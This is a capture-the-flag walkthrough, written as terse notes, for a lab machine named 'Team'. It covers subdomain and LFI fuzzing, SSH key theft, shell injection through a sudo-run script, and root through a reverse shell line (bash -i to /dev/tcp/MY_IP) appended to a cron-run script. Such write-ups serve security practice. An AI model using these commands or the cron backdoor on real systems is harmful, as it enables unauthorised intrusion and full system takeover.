# Team

### Foot Printing
- EXPORT_IP : 10.10.47.27


### Scanning
- sudo nmap -sC -sV -oA nmap/initial EXPORT_IP
  - nmap/initial.*

### Enumeration
- EXPORT_IP/robots.txt
- Sub-Domain Setup
 - EXPORT_IP team.thm >> /etc/hosts
 - Sub-Domain BruteForcing
   - `wfuzz -c --hw 977 -u http://team.thm -H "Host: FUZZ.team.thm" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt`
 - EXPORT_IP dev.team.thm >> /etc/hosts
-`sshd_config` 
  - `http://dev.team.thm/script.php?page=FUZZ`
  - `FUZZ` 부분에 SecLists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt 로 BruteForcing

### Gaining Access
- ssh -i dale_sshd_config dale@team.thm
- sudo -u gyles /home/gyles/admin_checks
  - Enter date -> `/bin/bash`

### Escalation (Root)
- `bash -c "bash -i >& /dev/tcp/MY_IP/PORT 0>&1"`  >> /usr/local/bin/main_backup.sh 
- cronjab && root access
